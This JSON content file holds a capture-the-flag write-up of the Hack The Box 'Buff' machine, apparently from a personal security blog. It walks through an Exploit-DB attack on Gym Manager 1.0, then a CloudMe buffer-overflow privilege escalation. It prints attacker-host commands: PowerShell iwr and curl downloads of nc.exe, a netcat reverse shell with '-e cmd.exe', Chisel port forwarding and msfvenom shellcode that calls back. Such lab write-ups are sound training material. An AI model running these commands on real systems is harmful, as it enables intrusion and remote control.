{
    "note":"title must match route name in App.js",
    "title":"Buff",
    "path":"buff",
    "tags":["easy","ctf", "box", "htb","web","cms", "powershell", "iwr", "python webserver", "apache 2.4.43","chisel","cloudme 1.11.2","curl","download file","nsfvenom","port forwarding","powershell iwr", "windows","winpeas","Gym Manager 1.0", "privesc"],
    "date":"27/06/2023",
    "location": "./writeup/",
    "banner":"writeup/buff/banner.gif",
    "type":"writeup",
    "search":[
        {
            "section":"Scanning",
            "description":"Scanning Windows box with port 80 exposed, hosting website built with Gym Manager vulnerable to CVE giving access to the machine. Machine is vulnerable due to CLoudMe process not update."
        },
        {
            "section":"Exploiting Gym Manager",
            "description":"Indentified the Gym Manager CVE with RCE - Remote Code Execution gave me a remote shell"
        },
        {
            "section":"Exploiting Gym Manager",
            "description":"Downloaded NC - Netcat using pyhton web server and the Windows PowerShell iwr command and upgraded to a reverse shell. Alternatively, curl can also be used on this system."
        },
        {
            "section":"Exploiting Gym Manager",
            "description":"Opened NC - Netcat listener to upgrade the shell"
        },
        {
            "section":"Search vulnerable process",
            "description":"Searched for vulnerable process obtained with winpeas and found vulnerable CloudMe process"
        },
        {
            "section":"Port Forwarding",
            "description":"Employing port forwarding with Chisel to execute CVE in Python from Kali"
        },
        {
            "section":"Exploitation",
            "description":"Privilege escalation using nsfvenom generated shellcode for the CVE"
        }
    ],
    "body":[
        {
            "id":"Ignite",
            "title":"<h1> <span style=\"color:#da1953\">Ign</span>ite</h1><hr>",
            "body":[
                {
                    "id":"banner",
                    "title":"",
                    "body":[
                        "<img src=\"/cyber/writeup/buff/banner.gif\" alt=\"\">"
                    ]
                },
                {
                    "id":"Scanning",
                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1><hr>",
                    "body":[
                        "<br><pre>PORT     STATE SERVICE    VERSION<br>7680/tcp open  pando-pub?<br>8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</pre><br>"
                    ] 
                },
                {
                    "id":"Exploiting Gym Manager",
                    "title":"<h1><span style=\"color:#da1953\">Exp</span>loiting Gym Manager</h1>",
                    "body":[
                        "<p>The scanning reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information. In the page <i>contact</i>there is a information about the sofware used to build the site which is<i>Gym Manager Software 1.0</i>.</p>",
                        "<p><img src=\"/cyber/writeup/buff/394c824c975047da8772b922fcbc9b46.png\"></p>",
                        "<p>Searching a vulnerability or and exploit for, leads me to <a data-from-md title='https://www.exploit-db.com/exploits/48506' href='https://www.exploit-db.com/exploits/48506'>https://www.exploit-db.com/exploits/48506</a>. Then I donwloaded and run it as <code>python 48506.py http://10.10.10.198:8080/</code> and it ended up exploiting the software and giving me a shell. I can't do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.</p>",
                        "<p>In order to do so I decided to download Netcat (nc) to the server and it includes a few steps:</p>",
                        "<ol><li>Open a web server in my Kali inside my Buff folder that I created to solve the box where I have all the exploits and programs <code>sudo python3 -m http.server 8080</code><br> <img src=\"/cyber/writeup/buff/56bd6f9c0943430d9b1e04b84c11a092.png\"></li><li>From the box I can connect to the Python HTTP server and download files, to do that there are two ways:<ol><li><code>powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe</code></li><li><code>curl http://10.10.14.197:8080/nc.exe -o nc.exe</code><br><img src=\"/cyber/writeup/buff/a9274a65c7384c498436604953f1e81e.png\"><br>In the directory, there are also other users artefacts.</li></ol></li></ol>",
                        "<p>Once Downloaded I open a listener on my Kali <code>nc -lvp 4444</code> and a client on the box in a way that upon connecting it will execute a command <code>nc.exe 10.10.14.197 4444 -e cmd.exe</code> it will result in having a command of the box on my kali machine.</p>",
                        "<img src=\"/cyber/writeup/buff/bf06f1f38deb40e19379033fd6329abe.png\"><br>"
                    ]   
                },
                {
                    "id":"User Flag",
                    "title":"<h1><span style=\"color:#da1953\">Use</span>r flag</h1>",
                    "body":[
                        "<p>Once got the shell I can move to the location of the user flag</p>",
                        "<img src=\"/cyber/writeup/buff/ff20b0d447b54c38909325cbea503bca.png\"><br>"
                    ]
                },
                {
                    "id":"Priviledge escalation",
                    "title":"<h1><span style=\"color:#da1953\">Pri</span>viledge escalation</h1>",
                    "body":[
                        {
                            "id":"Search vulnerable process",
                            "title":"<h2>Search vulnerable process</h2>",
                            "body":[
                                "<p>To search a vulnerable process its possible to use <code>winpeas.exe</code> but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding <code>CloudMe.exe</code>.</p>",
                                "<p>Searching for an exploit I ended up finding many and various versions of Cloudme’s version.</p>"
                            ]
                        },
                        {
                            "id":"Finding CloudMe Version",
                            "title":"<h2>Finding CloudMe Version</h2>",
                            "body":[
                                "<p>While I don't have administrator privilege I can't see the version of the program with <code>tasklist</code> or <code>Get-Proces</code> so I had to look around to see if I find something. In the end, the executable was in the <code>Shaun</code> user’s Download folder, which contains also the version number in the name.<br>",
                                "<img src=\"/cyber/writeup/buff/3b6f506a74344ceabfef62b8cdacb5a5.png\"><br>"
                            ]
                        },
                        {
                            "id":"Port Forwarding",
                            "title":"<h2>Port Forwarding</h2>",
                            "body":[
                                "<p>I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotely exploit it and neither locally because the script is in Python and it is not installed in the box. So I used <b>Chisel</b> to forward the connection. I had to donwload a precompiled version for Windows and Linux from <a data-from-md title='https://github.com/jpillora/chisel/releases/' href='https://github.com/jpillora/chisel/releases/'>https://github.com/jpillora/chisel/releases/</a>. I loaded Chisel in the box in the same way as Netcat. From my Kali machine, I opened a server as shown in <a data-from-md title='https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html' href='https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html'>https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a><br> <code>./chisel server -p 7777 --reverse</code> and a client in the box as <code>chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888</code><br>",
                                "<img src=\"/cyber/writeup/buff/18cc7f4ffbdb4c4a97f31ff0a6bdc1f0.png\"><br>"
                            ]
                        },
                        {
                            "id":"Exploitation",
                            "title":"<h2>Exploitation</h2>",
                            "body":[
                                "<p>Now my choice of exploit comes down to four possibilities.</p>",
                                "<p><img src=\"/cyber/writeup/buff/dce0e1743ade4d6cbee6d9b255793b64.png\"></p>",
                                "<p>And I chose the PoC one.</p>",
                                "After opening the exploit it suggested a command line to enumerate a shellcode, so I generated a shellcode that I needed in order to exploit CloudMe and give a reverse shell. <code>msfvenom -a x86 -p windows/exec CMD='C:\\xampp\\htdocs\\gym\\upload\nc.exe 10.10.14.197 1111 -e cmd.exe' -b '\\x00\\x0A\\x0D' -f python</code> Now I have replaced the new shell code with the old one inside the script. Once exploited the CloudMe, it will invoke <b>nc.exe</b> and try to connect to my Kali machine so before that I have to listen in port 1111. And run the exploit from another shell.<br>",
                                "<p><img src=\"/cyber/writeup/buff/9f79a8643caa4742af026633b9a6cad5.png\"></p>",
                                "<p>The root flag in on the administrator desktop.</p>"
                            ]
                        }
                    ]
                }
            ]
        }
    ]
}
